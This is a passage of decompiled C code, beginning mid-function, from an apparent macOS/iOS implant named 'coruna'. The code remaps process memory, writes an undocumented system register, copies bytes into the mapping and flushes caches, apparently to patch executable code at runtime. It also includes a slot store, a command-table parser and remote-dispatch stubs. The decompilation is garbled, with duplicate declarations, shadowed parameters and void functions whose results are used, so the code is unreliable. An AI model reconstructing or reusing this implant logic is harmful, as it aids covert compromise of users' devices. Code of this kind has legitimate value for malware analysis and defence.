  uint8_t *ptr;
  int err;
  kern_return_t lk5;
  unsigned long size;
  long addr;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  mach_port_t scratch;
  vm_inherit_t inheritance;
  vm_size_t lv11;
  vm_address_t bootargs;
  
  version = *(unsigned long *)k_implant_vm_page_mask_slot;
  tag = version & (unsigned long)ctx;
  port = tag + len;
  size = *(unsigned long *)k_implant_vm_page_size_slot;
  u = 0;
  if (size != 0) {
    u = port / size;
  }
  addr = port - u * size;
  handle = 0;
  if (addr != 0) {
    handle = size - addr;
  }
  size = handle + port;
  bootargs = 0;
  scratch = 0;
  lv11 = size;
  err = _memcmp(ctx,scratch,len);
  inheritance = (vm_inherit_t)lv11;
  if (err != 0) {
    port = (unsigned long)ctx & (version ^ 0xffffffffffffffff);
    err = coruna_implant_touch_buffer(port,size);
    ptr = k_implant_mach_task_self_slot;
    if ((((err != 0) &&
         (lk5 = _mach_make_memory_entry_64
                            (*(vm_map_t *)k_implant_mach_task_self_slot,
                             (memory_object_size_t *)&implant_memobj_size_scratch,port,1,&scratch,0),
         lk5 == 0)) &&
        (lk5 = _vm_map(*(vm_map_t *)ptr,&bootargs,size,0,0x1001,scratch,0,0,1,1,inheritance),
        lk5 == 0)) &&
       ((err = coruna_implant_touch_buffer(bootargs,size), err != 0 && ((k_implant_icache_mode & 0xfe) == 2)))) {
      UnkSytemRegWrite(3,6,0xf,1,5,k_implant_dsb_ctrl_a);
      InstructionSynchronizationBarrier();
      _memcpy((void *)(bootargs + tag),scratch,len);
      DataSynchronizationBarrier(3,3,0);
      if ((k_implant_icache_mode & 0xfe) == 2) {
        UnkSytemRegWrite(3,6,0xf,1,5,k_implant_dsb_ctrl_b);
        InstructionSynchronizationBarrier();
        _sys_icache_invalidate(ctx,len);
        _sys_dcache_flush(ctx,len);
        _memcmp(ctx,scratch,len);
      }
    }
  }
  if (bootargs != 0) {
    _vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,bootargs,size);
  }
  if (1 < scratch + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
  }
  return;
}
void coruna_implant_touch_buffer(long handle,size_t len)
{
  void *ptr;
  
  if (((handle != 0) && (len != 0)) && (ptr = _malloc(len), ptr != (void *)0x0)) {
    ___memcpy_chk(ptr,handle,len,0xffffffffffffffff);
    _free(ptr);
  }
  return;
}
void coruna_implant_ctx_alloc(uint64_t val)
{
  coruna_implant_ctx_init(val,0x18);
  return;
}
void coruna_implant_ctx_init(uint64_t *val)
{
  int err;
  uint32_t *ptr;
  uint64_t scratch;
  
  if (val != (uint64_t *)0x0) {
    scratch = 0;
    err = coruna_pthread_rwlock_init(&scratch);
    if (err == 0) {
      ptr = _calloc(1,0x38);
      if (ptr == (uint32_t *)0x0) {
        coruna_pthread_rwlock_destroy(scratch);
      }
      else {
        *ptr = 0x10001;
        *(uint64_t *)(ptr + 2) = scratch;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_implant_vtable_write;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_implant_vtable_read_get;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_implant_vtable_read_put;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_implant_vtable_read_stream;
        *(uint8_t **)(ptr + 0xc) = &k_implant_branch_mask;
        *val = ptr;
      }
    }
  }
  return;
}
void coruna_implant_ctx_free(uint64_t *val)
{
  if ((val != (uint64_t *)0x0) && (val[1] != 0)) {
    coruna_pthread_rwlock_destroy();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[6] = 0;
    _free(val);
  }
  return;
}
void coruna_implant_ctx_build(long *handle,long addr_2)
{
  long handle;
  uint u;
  uint size;
  bool err;
  int err;
  long addr;
  unsigned long version;
  uint *ptr;
  uint scratch;
  void *bootargs;
  uint64_t thread_attr;
  long host_info;
  
  host_info = 0;
  if (((handle != (long *)0x0) && (addr_2 != 0)) &&
     (err = coruna_implant_ctx_init(&host_info,0x18), err == 0)) {
    addr = *(long *)(host_info + 8);
    ptr = (uint *)(addr_2 + 0x150);
    version = 0;
    do {
      size = ptr[-4];
      if (size == 0) {
fail:
        err = 0;
      }
      else {
        if ((*(long *)(ptr + -2) == 0) || (*ptr == 0)) goto done;
        thread_attr = 0;
        err = coruna_implant_prepare_slot(addr,size,&thread_attr);
        if (err == 0x7003) {
          u = *(uint *)(addr + 0xe8);
          if (u < *(uint *)(addr + 0xe4)) {
            err = 0;
            handle = addr + (unsigned long)u * 0x20;
            *(uint *)(handle + 0xf0) = size;
            *(uint8_t *)(handle + 0xf8) = 2;
            *(uint64_t *)(handle + 0x100) = *(uint64_t *)(ptr + -2);
            *(uint *)(handle + 0x108) = *ptr;
            *(uint *)(addr + 0xe8) = u + 1;
          }
          else {
            err = 0x7006;
          }
        }
        else if (err == 0) {
          bootargs = (void *)0x0;
          scratch = 0;
          err = coruna_implant_resolve_typed_buffer(addr,thread_attr,&bootargs,&scratch);
          if (err == 0) {
            size = *ptr;
            if (((bootargs == *(void **)(ptr + -2)) && (scratch == size)) ||
               ((scratch == size &&
                (err = _memcmp(bootargs,*(void **)(ptr + -2),(unsigned long)size), err == 0))))
            goto fail;
            err = 0x700a;
          }
        }
      }
      if (err != 0) break;
      ptr = ptr + 0xc;
      err = version < 0x17;
      version = version + 1;
    } while (err);
    if (err == 0) {
      *handle = host_info;
    }
    else {
done:
      coruna_implant_ctx_free(host_info);
    }
  }
  return;
}
void coruna_implant_dispatch_wrlocked(short *arg,uint64_t val,long handle,uint64_t id_2)
{
  int err;
  pthread_rwlock_t *ptr;
  
  if (((((arg != (short *)0x0) && (*arg == 1)) && (arg[1] != 0)) &&
      ((ptr = *(pthread_rwlock_t **)(arg + 4), ptr != (pthread_rwlock_t *)0x0 &&
       ((int)val != 0)))) &&
     ((handle != 0 && (((int)id_2 != 0 && (err = _pthread_rwlock_wrlock(ptr), err == 0)))
      ))) {
    coruna_implant_write_slot(ptr,val,handle,id_2,0);
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_implant_vtable_write(long handle,long addr_2,uint64_t val)
{
  int err;
  pthread_rwlock_t *ptr;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && (int)val != 0)) &&
     (err = _pthread_rwlock_wrlock(ptr), err == 0)) {
    coruna_implant_apply_command_table(ptr,2,addr_2,val);
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_implant_vtable_read_get(long handle,uint64_t val,long addr_2,long off_3)
{
  int err;
  pthread_rwlock_t *ptr;
  uint64_t scratch;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      ((ptr != (pthread_rwlock_t *)0x0 && (int)val != 0) && addr_2 != 0) && off_3 != 0))
     && (err = _pthread_rwlock_rdlock(ptr), err == 0)) {
    scratch = 0;
    err = coruna_implant_prepare_slot(ptr,val,&scratch);
    if (err == 0) {
      coruna_implant_resolve_typed_buffer(ptr,scratch,addr_2,off_3);
    }
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_implant_vtable_read_put(long handle,long addr_2,long off_3)
{
  int err;
  pthread_rwlock_t *ptr;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && off_3 != 0)) &&
     (err = _pthread_rwlock_rdlock(ptr), err == 0)) {
    coruna_implant_match_remote_buffer(ptr,addr_2,off_3);
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_implant_vtable_read_stream(long handle,long addr_2,uint64_t val)
{
  uint32_t u;
  int err;
  pthread_rwlock_t *ptr;
  uint32_t scratch;
  uint64_t bootargs;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0)) &&
     (err = _pthread_rwlock_rdlock(ptr), err == 0)) {
    if (*(int *)(ptr[1].__opaque + 0x18) != 0) {
      u = *(uint32_t *)(ptr[1].__opaque + 0x20);
      bootargs = 0;
      scratch = 0;
      err = coruna_implant_resolve_typed_buffer(ptr,ptr[1].__opaque + 0x20,&bootargs,&scratch);
      if (err == 0) {
        coruna_implant_dispatch(handle,u,bootargs,scratch,val);
      }
    }
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_implant_resolve_typed_buffer(long handle,long addr_2,long *off_3,uint32_t *size)
{
  char err;
  long handle;
  
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) &&
     (size != (uint32_t *)0x0)) {
    err = *(char *)(addr_2 + 8);
    if ((err == '\x03') || (err == '\x02')) {
      handle = *(long *)(addr_2 + 0x10);
      if (handle == 0) {
        return;
      }
    }
    else {
      if (err != '\x01') {
        return;
      }
      if (*(long *)(handle + 0xd8) == 0) {
        return;
      }
      handle = *(long *)(handle + 0xd8) + *(long *)(addr_2 + 0x10);
    }
    *off_3 = handle;
    *size = *(uint32_t *)(addr_2 + 0x18);
  }
  return;
}
void coruna_implant_apply_command_table(long handle,int flags,int *count_2,uint size)
{
  uint u;
  int *err;
  unsigned long size;
  int err;
  uint version;
  int status;
  int flags;
  unsigned long port;
  long handle;
  unsigned long tag;
  int *status;
  uint *ptr;
  unsigned long kind;
  uint *buf;
  uint scratch;
  void *bootargs;
  
  if ((((handle != 0) && (count_2 != (int *)0x0)) && (size != 0)) &&
     ((7 < size && (*count_2 == -0xff24111)))) {
    version = count_2[1];
    if ((version != 0) &&
       ((size = (unsigned long)version << 4 | 8, size <= size &&
        (err = *(int *)(handle + 0xe8), version <= (uint)(*(int *)(handle + 0xe4) - err))))) {
      tag = 0;
      while (err = count_2 + tag * 4 + 2, *err != 0) {
        buf = (uint *)(err + 2);
        version = *buf;
        if (version < (uint)size) {
          return;
        }
        ptr = (uint *)(count_2 + tag * 4 + 5);
        if (*ptr == 0) {
          return;
        }
        u = *ptr + version;
        if (u <= version || size < u) {
          return;
        }
        kind = 0xffffffffffffffff;
        status = (int *)(handle + 0xf0);
        do {
          version = *(uint *)(handle + 0xe8);
          kind = kind + 1;
          if (version <= kind) {
            if (flags == 2) {
              port = (unsigned long)(uint)(err + (int)tag);
              handle = handle + port * 0x20;
              *(uint64_t *)(handle + 0xf0) = *(uint64_t *)err;
              *(uint8_t *)(handle + 0xf8) = 2;
              kind = (long)count_2 + (unsigned long)*buf;
            }
            else {
              if (flags != 1) {
                return;
              }
              port = (unsigned long)(uint)(err + (int)tag);
              handle = handle + port * 0x20;
              *(uint64_t *)(handle + 0xf0) = *(uint64_t *)err;
              *(uint8_t *)(handle + 0xf8) = 1;
              kind = (unsigned long)*buf;
            }
            *(unsigned long *)(handle + 0x100) = kind;
            *(uint *)(handle + port * 0x20 + 0x108) = *ptr;
            *(uint *)(handle + 0xe8) = version + 1;
            goto fail;
          }
          if (*err == *status) {
            bootargs = (void *)0x0;
            scratch = 0;
            status = coruna_implant_resolve_typed_buffer(handle,status,&bootargs,&scratch);
            if (status == 0) {
              version = *ptr;
              if (bootargs == (void *)((long)count_2 + (unsigned long)*buf) && scratch == version) {
                status = 0;
              }
              else {
                if (scratch == version) {
                  flags = _memcmp(bootargs,(void *)((long)count_2 + (unsigned long)*buf),(unsigned long)version);
                  status = 0;
                  if (flags == 0) goto done;
                }
                status = 0x700a;
              }
            }
          }
          else {
            status = 0x7003;
          }
done:
          status = status + 8;
        } while (status == 0x7003);
        if (status != 0) {
          return;
        }
fail:
        tag = tag + 1;
        if ((uint)count_2[1] <= tag) {
          return;
        }
      }
    }
  }
  return;
}
void coruna_implant_match_remote_buffer(long handle,uint64_t *val,uint *size)
{
  uint u;
  int err;
  uint32_t *ptr;
  unsigned long size;
  long handle;
  unsigned long version;
  uint64_t *buf;
  unsigned long port;
  uint *str;
  uint scratch;
  void *bootargs;
  
  if ((((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) &&
     (*(int *)(handle + 0xe8) != 0)) {
    version = 0;
    port = (unsigned long)(*(int *)(handle + 0xe8) * 0x10 + 0x27U & 0xffffffe0);
    handle = handle + 0xf0;
    size = port;
    do {
      bootargs = (void *)0x0;
      scratch = 0;
      err = coruna_implant_resolve_typed_buffer(handle,handle,&bootargs,&scratch);
      if (err != 0) {
        return;
      }
      version = version + 1;
      u = (scratch + 0x1f & 0xffffffe0) + (int)size;
      size = (unsigned long)u;
      handle = handle + 0x20;
    } while (version < *(uint *)(handle + 0xe8));
    ptr = _malloc(size);
    if (ptr != (uint32_t *)0x0) {
      _bzero(ptr,size);
      err = *(int *)(handle + 0xe8);
      *ptr = 0xf00dbeef;
      ptr[1] = err;
      if (err != 0) {
        version = 0;
        str = ptr + 5;
        buf = (uint64_t *)(handle + 0xf0);
        do {
          bootargs = (void *)0x0;
          scratch = 0;
          err = coruna_implant_resolve_typed_buffer(handle,buf,&bootargs,&scratch);
          if (err != 0) {
            _bzero(ptr,size);
            _free(ptr);
            return;
          }
          str[-1] = (uint)port;
          *str = scratch;
          *(uint64_t *)(str + -3) = *buf;
          _memcpy((void *)((long)ptr + port),bootargs,(unsigned long)scratch);
          port = (unsigned long)((scratch + 0x1f & 0xffffffe0) + (uint)port);
          version = version + 1;
          str = str + 4;
          buf = buf + 4;
        } while (version < *(uint *)(handle + 0xe8));
      }
      *val = ptr;
      *size = u;
    }
  }
  return;
}
void coruna_implant_prepare_slot(long handle,int flags,uint64_t *val)
{
  int *err;
  unsigned long u;
  
  if (((handle != 0) && (flags != 0)) && (val != (uint64_t *)0x0)) {
    u = (unsigned long)*(uint *)(handle + 0xe8);
    if (*(uint *)(handle + 0xe8) != 0) {
      err = (int *)(handle + 0xf0);
      do {
        if (*err == flags) {
          *val = err;
          return;
        }
        err = err + 8;
        u = u - 1;
      } while (u != 0);
    }
    return;
  }
  return;
}
void coruna_implant_write_slot(long handle,int flags,void *ctx,uint size,int count_2)
{
  uint u;
  int err;
  void *ptr;
  long handle;
  unsigned long size;
  uint scratch;
  void *bootargs;
  
  if ((((handle != 0) && (flags != 0)) && (ctx != (void *)0x0)) && (size != 0)) {
    u = *(uint *)(handle + 0xe8);
    size = (unsigned long)u;
    if (u != 0) {
      handle = 0;
      do {
        if (*(int *)(handle + 0xf0 + handle) == flags) {
          bootargs = (void *)0x0;
          scratch = 0;
          err = coruna_implant_resolve_typed_buffer(handle,handle + handle + 0xf0,&bootargs,&scratch);
          if (err != 0) {
            return;
          }
          if (bootargs == ctx && scratch == size) {
            return;
          }
          if (scratch != size) {
            return;
          }
          _memcmp(bootargs,ctx,(unsigned long)size);
          return;
        }
        handle = handle + 0x20;
      } while (size * 0x20 - handle != 0);
    }
    if (u < *(uint *)(handle + 0xe4)) {
      if (count_2 == 0) {
        handle = handle + size * 0x20;
        *(int *)(handle + 0xf0) = flags;
        *(uint8_t *)(handle + 0xf8) = 2;
        *(void **)(handle + 0x100) = ctx;
        *(uint *)(handle + 0x108) = size;
      }
      else {
        ptr = _malloc((unsigned long)size);
        if (ptr == (void *)0x0) {
          return;
        }
        _memcpy(ptr,ctx,(unsigned long)size);
        handle = handle + size * 0x20;
        *(int *)(handle + 0xf0) = flags;
        *(uint8_t *)(handle + 0xf8) = 3;
        *(void **)(handle + 0x100) = ptr;
        *(uint *)(handle + 0x108) = size;
        u = *(uint *)(handle + 0xe8);
      }
      *(uint *)(handle + 0xe8) = u + 1;
    }
  }
  return;
}
void coruna_pthread_rwlock_destroy(pthread_rwlock_t *arg)
{
  uint u;
  unsigned long size;
  char *ptr;
  
  if (arg != (pthread_rwlock_t *)0x0) {
    _pthread_rwlock_destroy(arg);
    u = *(uint *)(arg[1].__opaque + 0x18);
    if (u != 0) {
      size = 0;
      ptr = arg[1].__opaque + 0x38;
      do {
        if (ptr[-0x10] == '\x03') {
          _bzero(*(void **)(ptr + -8),(unsigned long)*(uint *)ptr);
          _free(*(void **)(ptr + -8));
          u = *(uint *)(arg[1].__opaque + 0x18);
        }
        size = size + 1;
        ptr = ptr + 0x20;
      } while (size < u);
    }
    if ((*(void **)(arg[1].__opaque + 8) != (void *)0x0) &&
       (*(uint *)(arg[1].__opaque + 0x10) != 0)) {
      _bzero(*(void **)(arg[1].__opaque + 8),(unsigned long)*(uint *)(arg[1].__opaque + 0x10));
      _free(*(void **)(arg[1].__opaque + 8));
    }
    _bzero(arg,(unsigned long)*(uint *)(arg[1].__opaque + 0x14) * 0x20 + 0xf0);
    _free(arg);
    return;
  }
  return;
}
void coruna_pthread_rwlock_init(uint64_t *val,uint size)
{
  size_t ls1;
  int err;
  pthread_rwlock_t *ptr;
  
  if (val != (uint64_t *)0x0) {
    if (size < 0x19) {
      size = 0x18;
    }
    ls1 = (unsigned long)size * 0x20 + 0xf0;
    ptr = _malloc(ls1);
    if (ptr != (pthread_rwlock_t *)0x0) {
      _bzero(ptr,ls1);
      err = _pthread_rwlock_init(ptr,(pthread_rwlockattr_t *)0x0);
      if (err == 0) {
        *(uint *)(ptr[1].__opaque + 0x14) = size;
        *val = ptr;
      }
      else {
        _bzero(ptr,ls1);
        _free(ptr);
      }
    }
  }
  return;
}





void coruna_implant_remote_nop5(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_implant_remote_dispatch != 0) {
    coruna_implant_nop();
    coruna_implant_remote_handler(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}





void coruna_implant_dispatch(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_implant_remote_dispatch != 0) {
    coruna_implant_nop();
    coruna_implant_remote_handler(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}
void coruna_implant_nop(void)
{
  return;
}
void coruna_implant_nop_2(void)
{
  return;
}
void coruna_implant_nop_3(void)
{
  return;
}
void coruna_implant_nop_4(void)
{
  return;
}





void coruna_implant_remote_stub(uint64_t val,uint64_t id_2)
{
  (*k_implant_remote_dispatch)(0xb389,val,id_2,k_implant_remote_arg_a);
  return;
}





void coruna_implant_remote_handler(uint64_t val,uint64_t id_2)
{
  (*k_implant_remote_dispatch)(0xb389,val,id_2,k_implant_remote_arg_b);
  return;
}

